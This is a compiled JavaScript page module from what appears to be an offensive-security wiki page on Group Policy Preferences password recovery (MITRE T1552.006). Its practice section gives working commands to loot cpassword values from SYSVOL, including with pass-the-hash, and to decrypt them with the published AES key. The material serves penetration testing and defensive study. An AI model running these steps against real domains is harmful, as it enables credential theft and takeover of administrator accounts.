import{_ as o,c as p,a5 as n,G as a,w as t,B as r,o as d,j as s,a as e}from"./chunks/framework.B5CpDqM0.js";const b=JSON.parse('{"title":"Group Policy Preferences","description":"MITRE ATT&CK‚Ñ¢ Sub-technique T1552.006","frontmatter":{"description":"MITRE ATT&CK‚Ñ¢ Sub-technique T1552.006","authors":"ShutdownRepo, p0dalirius, sckdev"},"headers":[],"relativePath":"ad/movement/credentials/dumping/group-policies-preferences.md","filePath":"ad/movement/credentials/dumping/group-policies-preferences.md","lastUpdated":1724982529000}'),c={name:"ad/movement/credentials/dumping/group-policies-preferences.md"};function k(g,i,u,F,y,m){const l=r("PluginTabsTab"),h=r("PluginTabs");return d(),p("div",null,[i[2]||(i[2]=n('<h1 id="group-policy-preferences" tabindex="-1">Group Policy Preferences <a class="header-anchor" href="#group-policy-preferences" aria-label="Permalink to &quot;Group Policy Preferences&quot;">‚Äã</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">‚Äã</a></h2><p>Windows systems come with a built-in Administrator (with an RID of 500) that most organizations want to change the password of. This can be achieved in multiple ways but there is one that is to be avoided: setting the built-in Administrator&#39;s password through Group Policies.</p><ul><li><strong>Issue 1</strong>: the password is set to be the same for every (set of) machine(s) the Group Policy applies to. If the attacker finds the admin&#39;s hash or password, he can gain administrative access to all (or set of) machines.</li><li><strong>Issue 2</strong>: by default, knowing the built-in Administrator&#39;s hash (RID 500) allows for powerful <a href="./../../ntlm/pth">Pass-the-Hash</a> attacks (<a href="./../../ntlm/pth#limitations-tips-and-tricks">read more</a>).</li><li><strong>Issue 3</strong>: all Group Policies are stored in the Domain Controllers&#39; <code>SYSVOL</code> share. All domain users have read access to it. This means all domain users can read the encrypted password set in Group Policy Preferences, and since Microsoft published the encryption key around 2012, the password can be decryptedü§∑‚Äç‚ôÇÔ∏è.</li></ul><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">‚Äã</a></h2>',5)),a(h,null,{default:t(()=>[a(l,{label:"UNIX-like"},{default:t(()=>i[0]||(i[0]=[s("p",null,[e("From UNIX-like systems, the "),s("a",{href:"https://github.com/SecureAuthCorp/impacket/blob/master/examples/Get-GPPPassword.py",target:"_blank",rel:"noreferrer"},"Get-GPPPassword.py"),e(" (Python) script in the impacket examples can be used to remotely parse "),s("code",null,".xml"),e(" files and loot for passwords.")],-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# with a NULL session")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"Get-GPPPassword.py"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -no-pass"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DOMAIN_CONTROLLER'")]),e(`
`),s("span",{class:"line"}),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# with cleartext credentials")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"Get-GPPPassword.py"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'")]),e(`
`),s("span",{class:"line"}),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# pass-the-hash")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"Get-GPPPassword.py"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -hashes"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'LMhash':'NThash'"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'")])])])],-1),s("p",null,[e("Alternatively, searching for passwords can be done manually (or with Metasploit's "),s("code",null,"smb_enum_gpp"),e(" module), however it requires mounting the "),s("code",null,"SYSVOL"),e(" share, which can't be done through a docker environment unless it's run with privileged rights.")],-1),s("p",null,[e("Tools like "),s("a",{href:"https://github.com/skelsec/pypykatz",target:"_blank",rel:"noreferrer"},"pypykatz"),e(" (Python) and "),s("a",{href:"https://github.com/BustedSec/gpp-decrypt",target:"_blank",rel:"noreferrer"},"gpp-decrypt"),e(" (Ruby) can then be used to decrypt the matches.")],-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# create the target directory for the mount")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"sudo"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," mkdir"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," /tmp/sysvol")]),e(`
`),s("span",{class:"line"}),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# mount the SYSVOL share")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"sudo"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," mount"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"\\")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -o"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," domain='domain.local'"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"\\")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -o"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," username='someuser'"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"\\")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -o"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," password='password'"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"\\")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -t"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," cifs"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"\\")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," '//domain_controller/SYSVOL'"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"\\")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," /tmp/sysvol")]),e(`
`),s("span",{class:"line"}),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},'# recursively look for "cpassword" in Group Policies')]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"sudo"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," grep"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -ria"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," cpassword"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," /tmp/sysvol/'domain.local'/Policies/"),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," 2>"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/dev/null")]),e(`
`),s("span",{class:"line"}),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# decrypt the string and recover the password")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"pypykatz"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," gppass"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"gpp-decrypt"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw")])])])],-1)])),_:1}),a(l,{label:"Windows"},{default:t(()=>i[1]||(i[1]=[s("p",null,[e("From Windows systems, the GPP password can only be recovered from an authenticated (i.e. domain user) context (see "),s("a",{href:"./../impersonation"},"impersonation"),e(").")],-1),s("p",null,[s("a",{href:"https://github.com/PowerShellMafia/PowerSploit/",target:"_blank",rel:"noreferrer"},"PowerSploit"),e("'s "),s("a",{href:"https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1",target:"_blank",rel:"noreferrer"},"Get-GPPPassword"),e(" searches a Domain Controller's SYSVOL share "),s("code",null,"Groups.xml"),e(", "),s("code",null,"Services.xml"),e(", "),s("code",null,"Scheduledtasks.xml"),e(", "),s("code",null,"DataSources.xml"),e(", "),s("code",null,"Printers.xml"),e(" and "),s("code",null,"Drives.xml"),e(" files and returns plaintext passwords")],-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"Import-Module"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," ."),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"\\G"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"et-GPPPassword.ps1")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"Get-GPPPassword")])])])],-1),s("p",null,[e('This can also be achieved without tools, by "manually" looking for the '),s("code",null,"cpassword"),e(" string in xml files and by then manually decrypting the matches.")],-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"findstr"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," /S"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," cpassword"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," %logonserver%"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"\\s"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"ysvol"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"*"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},".xml")])])])],-1),s("p",null,"The decryption process is as follows",-1),s("div",{class:"language- vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"}),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",null,"1. decode from base64")]),e(`
`),s("span",{class:"line"},[s("span",null,"2. decrypt from AES-256-CBC the following hex key/iv")]),e(`
`),s("span",{class:"line"},[s("span",null," Key : 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b")]),e(`
`),s("span",{class:"line"},[s("span",null," IV : 0000000000000000000000000000000")]),e(`
`),s("span",{class:"line"},[s("span",null,"3. decode from UTF-16LE")])])])],-1)])),_:1})]),_:1}),i[3]||(i[3]=n('<h2 id="resources" tabindex="-1">Resources <a class="header-anchor" href="#resources" aria-label="Permalink to &quot;Resources&quot;">‚Äã</a></h2><p><a href="https://adsecurity.org/?p=2288" target="_blank" rel="noreferrer">https://adsecurity.org/?p=2288</a></p><p><a href="http://blog.carnal0wnage.com/2012/10/group-policy-preferences-and-getting.html" target="_blank" rel="noreferrer">http://blog.carnal0wnage.com/2012/10/group-policy-preferences-and-getting.html</a></p><p><a href="https://podalirius.net/en/articles/exploiting-windows-group-policy-preferences/" target="_blank" rel="noreferrer">https://podalirius.net/en/articles/exploiting-windows-group-policy-preferences/</a></p><p><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be" target="_blank" rel="noreferrer">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be</a></p>',5))])}const C=o(c,[["render",k]]);export{b as __pageData,C as default};
